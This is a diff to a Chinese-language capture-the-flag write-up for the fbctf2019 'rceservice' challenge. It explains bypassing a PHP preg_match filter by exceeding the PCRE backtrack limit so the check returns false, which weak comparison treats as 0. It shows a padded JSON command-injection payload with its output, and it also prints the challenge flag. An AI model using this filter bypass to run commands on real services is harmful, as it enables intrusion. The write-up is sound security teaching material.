@@ -33,13 +33,13 @@ if (isset($_REQUEST['cmd'])) {
 
 (https://www.php.net/manual/en/pcre.configuration.php)
 
-在弱比較下等同匹配成功，就成功繞過惹
+在弱比較(Weak typing)下等同匹配成功，就成功繞過惹
 
 (`false == 0` => `true`)
 
 e.g.
 
-`'{"cmd":"ls -al /","zz":"' + "a"*(1000000) + '"}'`
+`'{"cmd":"ls -al /home/rceservice/","zz":"' + "a"*(1000000) + '"}'`
 
 =>
 
@@ -52,6 +52,6 @@ dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
 Bypass successfully!
 
 
-詳細 payload 見exp.py
+詳細 payload 見[exp.py](https://github.com/w181496/CTF/blob/master/fbctf2019/rceservice/exp.py)
 
 flag: `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
